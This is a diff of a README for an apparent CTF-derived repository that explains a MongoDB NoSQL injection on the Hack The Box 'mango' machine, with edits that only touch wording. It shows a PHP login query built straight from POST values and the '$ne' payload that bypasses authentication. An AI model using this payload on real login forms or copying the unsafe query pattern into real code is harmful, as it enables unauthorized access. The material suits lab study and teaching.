@@ -1,5 +1,5 @@
 # enum-nosql
-MongoDB noSQL injection exploit example from **Hack the Box / mango** <https://app.hackthebox.com/machines/214> for usernames and their password enumeration.
+MongoDB noSQL injection exploit example from **Hack the Box / mango** <https://app.hackthebox.com/machines/214> for username and password enumeration.
 
 ## authentication bypass
 If parameter values are directly taken from autentization form as follow:
@@ -7,12 +7,12 @@ If parameter values are directly taken from autentization form as follow:
 $query = array("username" => $_POST["username"], "password" => $_POST["password"]);
 ```
 
-It's possible to use PHP's associative array processing to inject query that return always true and bypass autentication process.
+It's possible to use PHP associative array processing to inject query that return always true and bypass autentication process.
 ```php
 username[$ne]=""&password[$ne]=""
 ```
 
-PHP process malformed input as follow and 
+The PHP process malformed input as follow:
 ```php
 $query = array("username" => array("$ne" => ""), "password" => array("$ne" => ""));
 ```
